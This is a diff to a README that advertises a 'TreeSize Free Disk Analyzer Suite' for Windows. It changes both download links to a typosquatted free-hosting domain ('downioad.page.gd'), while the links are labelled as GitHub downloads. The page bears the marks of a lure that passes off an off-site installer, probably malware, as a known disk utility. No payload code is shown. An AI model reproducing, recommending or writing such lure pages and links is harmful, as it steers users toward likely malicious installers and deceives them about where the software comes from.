@@ -2,7 +2,7 @@
 
 Discover exactly where your disk space is going with the TreeSize Free Disk Analyzer Suite. This powerful application provides an intuitive, visual map of your drive usage, helping you quickly identify large files and folders to reclaim valuable space on your Windows 10 or 11 system. It's the ultimate companion for maintaining an efficient and clutter-free computer.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside: Key Features
 - **Comprehensive Drive Scanning:** Deep scans all connected drives and partitions, displaying a clear, hierarchical view of file and folder sizes.
@@ -44,7 +44,7 @@ A: You can always find the most recent, verified installer at the official downl
 ## Download
 Ready to take control of your disk space?
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *This software is provided as-is. Last updated: 2026. For advanced disk management features, consider exploring other versions in the TreeSize product family.*
